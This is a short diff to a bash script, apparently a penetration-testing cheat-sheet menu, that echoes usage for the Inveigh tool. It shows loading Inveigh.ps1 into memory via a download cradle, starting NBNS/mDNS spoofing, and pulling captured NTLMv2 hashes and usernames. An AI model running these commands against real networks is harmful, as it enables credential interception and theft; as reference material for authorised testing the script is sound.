@@ -1830,9 +1830,20 @@ echo -e ""
 echo -e ""
 echo -e "${LGREEN}Inveigh${RESTORE}"
 echo -e ""
-echo -e "$DownloadMethod "$InveighRepo"Inveigh.ps1);Invoke-Inveigh Y -NBNS Y -mDNS Y -HTTPS N -Proxy Y -IP [Host-IP]"
+echo -e "${IBLUE}Load into memory ${RESTORE}"
+echo -e "$DownloadMethod "$InveighRepo"Inveigh.ps1)"
 echo -e ""
+echo -e "Invoke-Inveigh Y -NBNS Y -mDNS Y -HTTPS N -Proxy Y -Console-Output Y -IP [Host-IP]"
+echo -e ""
+echo -ne "${IBLUE}Commands${RESTORE}
+Get-Inveigh -Log
+Get-Inveigh -NTLMv2Unique
+Get-Inveigh -NTLMv2Usernames
+Stop-Inveigh
 
+
+
+"
 echo -ne  "Return to Previous Menu?
 
     
